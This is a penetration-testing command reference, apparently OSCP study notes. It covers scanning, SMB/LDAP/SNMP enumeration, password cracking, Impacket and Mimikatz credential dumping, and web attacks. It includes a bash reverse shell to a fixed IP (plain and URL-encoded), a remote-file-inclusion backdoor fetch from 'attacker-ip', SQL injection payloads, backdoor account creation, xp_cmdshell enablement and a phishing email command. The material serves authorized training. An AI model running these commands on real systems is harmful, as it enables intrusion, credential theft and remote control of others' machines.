# Command archive

[Home](../../README.md) · [Primary workflows](../../README.md#choose-your-situation) · [File locations](file-locations.md)

This appendix preserves the former README’s technical reference and attribution. Use a current workflow to choose the test; consult this archive for variants and historical material. Individual examples still need the right OS, tool build, permission and execution console. Text blocks may combine lab observations and tool-console commands; they are not scripts to run as a whole.

Corrections in this revision remove unconditional success claims and clarify execution context. No target-lab validation is claimed for this archive. [Validation records](../lab-validation.md) distinguish actual local checks from illustrative output. [Original baseline](https://github.com/Rai2en/OSCP-Notes-2027/blob/09c2c271b4af2b24352972108676e019ef39d0df/README.md).

<a id="general"></a>
<a id="oscp-commands"></a>

## Setup and access

[Setup](#quick-setup) · [Enumeration](#recon-and-enumeration) · [Web](#web-attacks) · [Windows](#windows-privilege-escalation) · [Linux](#linux-privilege-escalation) · [Active Directory](#active-directory-pentesting)

### Quick setup

<a id="exports"></a>

#### Environment variables

Kali Bash; avoid storing literal passwords in shell history. These variables are local to this shell and its child processes.

```text
export TARGET_USER="<username>"
export LHOST="<local_ip>"
export LPORT="<local_port>"
export IP="<target_ip>"
export URL="<target_url>"
export VPN_CONFIG="<path_to_your_vpn_config>"
```

<a id="aliases-suggestion"></a>

#### Optional Bash aliases

```text
alias ll='ls -alF'
alias oscp-http='python3 -m http.server 8000'
alias oscp-listen='nc -lvnp "$LPORT"'
alias oscp-vpn='sudo openvpn "$VPN_CONFIG"'

```

#### Scanning

The maintained scan sequence is in the [target workflow](../methodology.md). Examples below are retained for syntax reference.

Kali Bash, inside your private session directory. Separate discovery from detailed service checks:

```text
mkdir -p scans
sudo nmap -sS -p- --reason -oA scans/tcp-all "$IP"
# Replace the example port list with ports discovered above.
nmap -sT -sC -sV -p 22,80,445 --reason -oA scans/services "$IP"
sudo nmap -sU --top-ports 20 --reason -oA scans/udp-top "$IP"
```

Use `-Pn` when discovery probes miss a known reachable host. UDP `open|filtered` is inconclusive. `-oA` saves normal, XML and grepable output. Timing must fit the link; a fast scan can miss a lossy service. See [scan semantics](https://nmap.org/book/man-port-scanning-techniques.html) and the [target workflow](../methodology.md).

### Important Locations

Use [targeted file triage](../file-triage.md) first. The full [historical path list](file-locations.md) is retained separately.

**Discovering KDBX files**
1. In Windows
```text
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
2. In Linux
```text
find / -type f -name '*.kdbx' 2>/dev/null
```

#### GitHub recon

- You need to find traces of the `.git` files on the target machine.
- Now navigate to the directory where the file is located, a potential repository.
- Commands

```text
# Log information of the current repository.
git log

# This will display the log of the stuff happened, like commit history which is very useful
git show <commit-id>

# This shows the commit information and the newly added stuff.
```

- If a web server exposes `.git`, a reviewed tool such as [git-dumper](https://github.com/arthaud/git-dumper) may recover part or all of the exposed repository. Inspect the actual recovered history and relevant configuration references. Exposure alone proves neither complete recovery nor an escalation path; validate each discovered secret or permission separately.
- Some useful GitHub dorks: [https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets) → this might not be relevant to the exam environment.

### Connecting to RDP

Use the installed FreeRDP 3 launcher (`xfreerdp3` or `xfreerdp`, depending on the package); check `/version` and `/help`. Clipboard redirection does not fix authentication. Verify unfamiliar certificate fingerprints before accepting them. [Package help](https://www.kali.org/tools/freerdp3/).

```text
xfreerdp3 /u:uname /v:IP
xfreerdp3 /d:domain.example /u:uname /v:IP
xfreerdp3 /d:domain.example /u:uname /v:IP +clipboard /dynamic-resolution
```

### Adding SSH Public key

- This can be used to get ssh session, on target machine which is based on linux

```text
ssh-keygen -t ed25519 #enter a passphrase when prompted

#This creates id_ed25519 and id_ed25519.pub in ~/.ssh by default.
# Target shell, as the intended account; append the public key and preserve existing entries.
# The SSH service and account policy must allow this method; record and remove only your added key.
mkdir -p ~/.ssh
chmod 700 ~/.ssh
nano ~/.ssh/authorized_keys #enter the copied content here
chmod 600 ~/.ssh/authorized_keys

#On Attacker machine
ssh -i ~/.ssh/id_ed25519 username@target_ip #enter the key passphrase if you set one
```

### File Transfers

- Netcat

```text
#Attacker
nc <target_ip> 1234 < nmap

#Target
nc -lvp 1234 > nmap
```

- Downloading on Windows

```text
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```

- Downloading on Linux

```text
wget http://lhost/file
curl -o <OUTPUT_FILE> http://<LHOST>/<FILE>
```

#### Windows to Kali

Kali Bash (use a dedicated transfer folder):

```text
impacket-smbserver -smb2support -username labtransfer -password '<TRANSFER_PASSWORD>' share ./transfer
```

Windows CMD:

```cmd
net use \\<KALI_IP>\share /user:labtransfer *
copy file \\<KALI_IP>\share\
net use \\<KALI_IP>\share /delete
```

Modern Windows policies can block guest SMB or require signing. Check the actual client policy and server support if negotiation fails; see [SMB hardening](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-security-hardening).

### Adding Users

Historical state-changing lab examples. They require sufficient rights and do not demonstrate how those rights were obtained. Prefer an identity check before account creation. Record created accounts/group changes and remove only your additions when restoring the lab or following the engagement plan.

#### Windows

```text
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
```

#### Linux

```text
adduser <uname> #Interactive
useradd -m <uname>

useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
```

### Password-Hash Cracking

Prefer local identification with the hash tools below. Historical external reference: [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/); do not submit exam or client secrets to a third-party service.
<a id="password-list-mentioned-in-the-offsec-discord-500-worst-passwordstxt"></a>

**Small training wordlist:** `500-worst-passwords.txt` (check the installed SecLists path).
#### Hash Identifier
- Identify the hash types using these tools
```text
hashid <FILE>
name-that-hash -f <FILE>
```
#### fcrackzip

```text
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
```

#### John

> [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
>
- If there’s an encrypted file, try to convert it into john hash and crack.

```text
ssh2john.py id_rsa > hash
#Convert the obtained hash to John format(above link)
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
#### keepass2John
Kali Bash: `smbclient -L "//$IP"` lists shares, not their files. Connect with `smbclient "//$IP/<SHARE>" -U '<DOMAIN>/<USER>'`, then use `ls`, `cd` and `get Database.kdbx` inside the SMB console.
```text
keepass2john Database.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
# For Hashcat, remove only the leading John database label; retain the hash fields.
cut -d: -f2- keepass.hash > keepass.hashcat
hashcat --help | grep "KeePass"
hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt
```

#### Hashcat

Select a mode from the actual extracted format. KeePass mode 13400 supports specific KeePass 1/2 formats; KDBX 4 output is not automatically compatible. Compare with the [upstream format examples](https://hashcat.net/wiki/doku.php?id=example_hashes), including their release-specific list.

> [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
>

```text
#Obtain the Hash module number
hashcat -m <number> hash wordlists.txt
```

### Pivoting through SSH

```text
ssh -i id_rsa -D 9050 adminuser@10.10.155.5 #SOCKS proxy port

#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"

proxychains4 nxc smb 10.10.10.0/24 #Example
```

### Dealing with Passwords

- Before online login tests, determine the account scope and lockout policy. Start with a small evidence-based set; offline cracking has different constraints. In authorized practice, consider:
    - Have a valid usernames first
    - Documented product defaults, such as `admin:admin` where applicable
    - Try `username:username` as first credential
    - If it’s related to a service, try default passwords.
    - Service name as the username as well as the same name for password.
    - Use Rockyou.txt
- Historical weak-password candidates (these are not universal product defaults):

```text
password
password1
Password1
Password@123
password@123
admin
administrator
admin@123

```

### Impacket

> The commands below use the `impacket-*` launchers provided by Kali's Impacket package. When running directly from an upstream source checkout, the equivalent example filenames end in `.py`.

```text
impacket-smbclient <domain>/<user>:<password>@<target-ip> #connect to the server rather than a specific share

impacket-lookupsid <domain>/<user>:<password>@<target-ip> #enumerate SIDs on the target

impacket-services <domain>/<user>:<password>@<target-ip> list #enumerate services

impacket-secretsdump <domain>/<user>:<password>@<target-ip> #dump secrets from the target

impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request #request Kerberoastable TGS tickets

impacket-GetNPUsers <domain>/ -dc-ip <dc-ip> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #AS-REP roasting with a username list

##RCE
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1

impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1

impacket-smbexec test.local/john:password123@10.10.10.1
impacket-smbexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1

impacket-atexec test.local/john:password123@10.10.10.1 <command>
impacket-atexec -hashes <LMHASH>:<NTHASH> test.local/john@10.10.10.1 <command>

```

### Evil-Winrm

Certificate authentication requires a certificate mapped to an authorized account. Built-in helpers such as `Bypass-4MSI` are version-dependent and are not guaranteed to bypass current defenses. [Upstream usage](https://github.com/Hackplayers/evil-winrm).

```text
##winrm service discovery
nmap -p5985,5986 <IP>
# 5985: HTTP transport; message protection depends on authentication/configuration.
# 5986: HTTPS transport.

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

### Mimikatz

```text
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch # LSA memory patching is distinct from SAM dumping

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

```

### Ligolo-ng

See the [pivoting guide](../pivoting.md) for commands separated by Kali, agent and Ligolo console, certificate fingerprint verification, internal routes, callback listeners and pivot-local services.

---

## Recon and Enumeration

- OSINT OR Passive Recon

    **Exam Tip:** Prioritize the supplied target network. Public OSINT examples below are additional training references; do not send private target data to external services.


    - whois: `whois <domain>` or `whois <domain> -h <IP>`
    - Google dorking,
        - site
        - filetype
        - intitle
        - GHDB - Google hacking database
    - OS and Service Information using [searchdns.netcraft.com](http://searchdns.netcraft.com)
    - Github dorking
        - filename
        - user
        - A tool called Gitleaks for automated enumeration
    - Shodan dorks
        - hostname
        - port
        - Then gather infor by going through the options
    - Scanning Security headers and SSL/TLS using [https://securityheaders.com/](https://securityheaders.com/)

### Port Scanning

```text
#use -Pn option if you're getting nothing in scan
nmap -sC -sV <IP> -v #Basic scan
nmap -T4 -A -p- <IP> -v # historical combined scan; -A adds OS/version/scripts/traceroute, timing must fit the link
# Review a specific NSE script and its behavior before selecting it.
nmap --script-help <SCRIPT_NAME>
sudo nmap -sV -p 443 --script <SCRIPT_NAME> <IP>

#NSE
updatedb
locate .nse | grep <name>
sudo nmap --script="name" <IP> #here we can specify other options like specific ports...etc

Test-NetConnection -Port <port> <IP>   #powershell utility

# PowerShell: check selected ports; inspect TcpTestSucceeded, not just PingSucceeded.
22,80,445 | ForEach-Object { Test-NetConnection -ComputerName '<IP>' -Port $_ -WarningAction SilentlyContinue }
```

### FTP enumeration

**Checklist**

- [ ] Anonymous login or known credentials tested?
- [ ] Readable backups/configurations downloaded selectively?
- [ ] Upload permissions and any corresponding web path verified?
- [ ] Passive/active transfer failure distinguished from login failure?

> **Exam Tip:** Use `binary` in the FTP console before transferring executables or archives; verify file integrity afterward.

```text
ftp <IP>
#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith anonymous:password

put <file> #uploading file
get <file> #downloading file

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice-versa
hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ftp

#check for vulnerabilities associated with the version identified.
```

### SSH enumeration

**Checklist**

- [ ] Correct port, account and key type?
- [ ] Weak credentials or a discovered reused password?
- [ ] Writable `.ssh` directory or `authorized_keys` for the intended account?
- [ ] Key ownership, permissions and server authentication policy checked?

> **Exam Tip:** A private-key passphrase prompt is local; it is different from the remote account password prompt.

```text
#Login
ssh uname@IP #enter password in the prompt

#Use the private key file you obtained, for example id_rsa or id_ecdsa
chmod 600 id_rsa
ssh -i id_rsa uname@IP #distinguish a local key passphrase prompt from a remote account-password fallback

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa > hash #replace id_ecdsa with the actual private key filename
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice-versa
hydra -L users.txt -P pass.txt <IP> ssh -s 2222
hydra -l offsec -P /usr/share/seclists/Passwords/500-worst-passwords.txt <IP> ssh

#check for vulnerabilities associated with the version identified.
```

### SMB enumeration

**Checklist**

- [ ] Anonymous access tested separately from authenticated access?
- [ ] Local or domain identity recorded?
- [ ] Readable shares, backups, scripts and credential stores checked?
- [ ] Write permissions distinguished from administrative execution rights?
- [ ] Recovered credentials retested on relevant services?

> **Exam Tip:** List shares, connect to one, then browse files. A share listing is not a recursive file inventory.

```text
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided

#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP

#In windows we can view like this
net view \\<computername/IP> /all

#NetExec
nxc smb <IP/range>
nxc smb 192.168.1.100 -u username -p password
nxc smb 192.168.1.100 -u username -p password --shares #lists available shares
nxc smb 192.168.1.100 -u username -p password --users #lists domain users
nxc smb 192.168.1.100 -u username -p password --pass-pol #shows the domain password policy
nxc smb 192.168.1.100 -u username -p password --port 445 --shares #specific port
nxc smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
#Two lists test combinations by default; use --no-bruteforce for matching username/password rows.

# Smbclient
smbclient -L //IP -U 'DOMAIN/username' # list shares; use -N only when testing anonymous access
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#Within SMB session
put <file> #to upload file
get <file> #to download file
```

- Downloading shares made easy - if the folder consists of several files, they all be downloading by this.

SMB client console, after connecting to the selected share:

```text
mask *
recurse ON
prompt OFF
mget *
```

### HTTP/S enumeration

Use the [maintained web workflow](../web.md) for baselines, access checks and decisions before selecting a historical example.

**Checklist**

- [ ] Every web port, redirect and discovered hostname checked?
- [ ] Source, robots.txt, scripts and API routes inspected?
- [ ] Weak credentials, reused passwords and application roles tested?
- [ ] Nonexistent-path response measured before directory discovery?
- [ ] Upload, file-read and execution permissions distinguished?

> **Exam Tip:** Save a valid request before modifying it; preserve Host, cookies and CSRF tokens.

- Check with whatweb 'URL'
- Inspect source, scripts and observed application features. Investigate a file only when an observed behavior or relevant metadata provides a reason; arbitrary steganography searches are low priority.
- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
- check /robots.txt folder
- Look for the hostname and add the relevant one to `/etc/hosts` file.
- Directory and file discovery - Obtain any hidden files which may contain juicy information

```text
dirbuster
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
```

- Vulnerability Scanning using nikto: `nikto -h <url>`
- `HTTPS`SSL certificate inspection, this may reveal information like subdomains, usernames…etc
- Default credentials, Identify the CMS or service and check for default credentials and test them out.
- Bruteforce

```text
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post or get can be obtained from Burpsuite. Also do capture the response for detailed info.

#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```

- if `cgi-bin` is present then do further fuzzing and obtain files like .sh or .pl
- Check if other services like FTP/SMB or anyothers which has upload privileges are getting reflected on web.
- API: record documented/discovered routes and compare authorization for the same object with two test identities; use [the current web workflow](../web.md).

```text
#identifying endpoints using gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything

#obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
```

- If there is any Input field check for **Remote Code execution** or **SQL Injection**
- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)

#### Wordpress

Use the installed `wpscan --help`; vulnerability details depend on the API token and database coverage. [Current help](https://www.kali.org/tools/wpscan/).

```text
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulnerable themes, and Timthumbs
wpscan --url "<TARGET_URL>" --enumerate vp,u,vt,tt --verbose --format cli --output target.log

# Add a WPScan API token to get vulnerability details. Never commit a real token.
wpscan --url http://alvida-eatery.org/ --api-token <WPScan_API_TOKEN>

#Accessing Wordpress shell
http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro

http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
```

#### Drupal

```text
droopescan scan drupal -u http://site
```

#### Joomla

```text
droopescan scan joomla --url http://site
sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce
```

### DNS enumeration

**Checklist**

- [ ] Correct lab DNS server queried explicitly?
- [ ] A/AAAA, PTR, MX, TXT and service records investigated where relevant?
- [ ] New names mapped to services and virtual hosts?
- [ ] Zone transfer considered only against the in-scope server?

> **Exam Tip:** A hostname can reveal a new application on a familiar IP. Revisit HTTP and domain authentication after DNS findings.

- Better use `Seclists` wordlists for better enumeration. [https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)

```text
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com

for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name

## DNS Recon
dnsrecon -d megacorpone.com -t std #standard recon
dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list

# DNS Bruteforce using dnsenum
dnsenum megacorpone.com

## NSlookup, a gold mine
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
```

### SMTP enumeration

**Checklist**

- [ ] Banner, EHLO capabilities and TLS support recorded?
- [ ] VRFY/EXPN/RCPT behavior checked against a control username?
- [ ] Usernames corroborated through another source?
- [ ] Mail-delivery examples separated from passive enumeration?

> **Exam Tip:** A disabled VRFY command does not prove that no valid users exist.

```text
nc -nv <IP> 25 #Version Detection
smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode, it can be RCPT, VRFY, EXPN

#Sending emain with valid credentials, the below is an example for Phishing mail attack
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

### LDAP Enumeration

**Checklist**

- [ ] RootDSE naming context and DC identity discovered?
- [ ] Anonymous and authenticated results distinguished?
- [ ] Base DN, TLS, bind identity and search filter correct?
- [ ] Users, groups, computers and useful descriptions correlated?

> **Exam Tip:** An empty search can mean a wrong base or insufficient rights; verify a known object before assuming the directory is empty.

Kali Bash: query RootDSE explicitly to discover naming contexts. Use the returned base DN for subtree searches. Prefer LDAPS (normally 636) or StartTLS (`-ZZ` on LDAP, normally 389) with a trusted certificate before sending a password. Anonymous queries may be denied.

```text
ldapsearch -x -H ldap://<IP>:389 -s base -b '' '(objectClass=*)' defaultNamingContext namingContexts
ldapsearch -x -H ldaps://<DC_FQDN>:636 -D '<USER>@<DOMAIN>' -W -b '<BASE_DN>' '(objectClass=user)' sAMAccountName
```

Historical bind/base examples below require the correct domain layout. A simple bind over plain LDAP can expose the password; use validated TLS for credentialed queries. See [OpenLDAP ldapsearch](https://www.openldap.org/software/man.cgi?query=ldapsearch&sektion=1).

```text

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info w're collecting
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py
#for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

#for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

#for domain admins (--users enumerates users generally)
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
```

### NFS Enumeration

**Checklist**

- [ ] Export paths and allowed clients recorded?
- [ ] Mount/list/read/write permissions checked independently?
- [ ] UID/GID mapping and root squashing verified?
- [ ] NFSv4-only behavior considered if showmount returns nothing?

> **Exam Tip:** A writable export alone does not establish a root escalation path; verify the server options and execution mount.

```text
nmap -sV --script=nfs-showmount <IP>
showmount -e <IP>
```

### SNMP Enumeration

**Checklist**

- [ ] UDP 161 and protocol version investigated?
- [ ] Community string validated with a small known OID query?
- [ ] Interfaces, processes, software and listening services correlated?
- [ ] Missing OIDs distinguished from absent services?

> **Exam Tip:** Walk a relevant subtree first; full MIB output can hide useful results in noise.

```text
#Nmap UDP scan
sudo nmap -sU -sV -p 161 --reason -oN snmp-scan.txt <IP>

snmp-check -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

### RPC Enumeration

**Checklist**

- [ ] Anonymous session distinguished from an authenticated bind?
- [ ] Domain identity and user/group RIDs recorded?
- [ ] Share and password-policy results correlated with SMB?
- [ ] Read-only queries separated from account-changing commands?

> **Exam Tip:** Use enumerated RIDs for follow-up queries; a successful bind does not imply permission for every RPC operation.

```text
rpcclient -U=user $IP
rpcclient -U "" -N "$IP" #Anonymous login
##Commands within in RPCclient
srvinfo
enumdomusers #users
enumpriv #enumerates server-supported privileges, not the current token privileges
queryuser <RID> #detailed user info; obtain RID from enumdomusers
getuserdompwinfo <RID> #password policy, get user-RID from previous command
lookupnames <user> #SID of specified user
createdomuser <username> #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all users
netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenumall
lsaenumsid #SID of all users
```

---

## Web Attacks

**Exam Tip:** Cross-platform PHP revershell: [https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)

### Directory Traversal

```text
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
# Inspect the raw HTTP body; the traversal here is in a query parameter.
curl "http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd"

#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
```

- URL Encoding

`--path-as-is` prevents curl normalizing dot segments in the URL path; it does not format a response or fix a `page=` query parameter. Percent-encoding and server decoding are separate layers. [curl documentation](https://curl.se/docs/manpage.html#--path-as-is).

```text
#Sometimes it doesn't show if we try path, then we need to encode them
curl --path-as-is "http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

- Wordpress
    - Simple exploit: https://github.com/leonjza/wordpress-shell

### Local File Inclusion

- Directory traversal reads files outside the intended directory. LFI makes the application include a local file; it does not inherently provide code execution. Code execution may become possible in specific cases, such as log poisoning or an unsafe PHP wrapper.

The log examples below assume executable PHP was already written into a readable log; adding `cmd=` alone does nothing. `data://` and remote URL inclusion depend on PHP configuration, including `allow_url_include`; `php://filter` can expose source without executing it. [PHP configuration](https://www.php.net/manual/en/filesystem.configuration.php).

```text
#At first we need
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```

- Remote file inclusion

```text
1. Obtain a php shell
2. host a file server
3.
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
we can also host a php reverseshell and obtain shell.
```

### SQL Injection

The [manual SQL injection procedure](../sql-injection.md) is the primary path: preserve a request, alternate controls and interpret the response. The payload variants below are historical syntax notes, not a detection protocol.

```text
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

- Blind SQL Injection - This can be identified by Time-based SQLI

```text
# A single slow response is inconclusive. Repeat alternating control/test requests; use the DB-specific syntax only after establishing context.
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

- Manual Code Execution

The first example is MSSQL and needs permission to enable/use `xp_cmdshell`. The later `INTO OUTFILE` example is MySQL/MariaDB: it needs FILE privilege, an allowed `secure_file_priv` location, a new writable file and an executing web handler. Do not combine their SQL dialects. [SQL Server](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option), [MySQL](https://dev.mysql.com/doc/refman/8.4/en/select-into.html).

```text
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
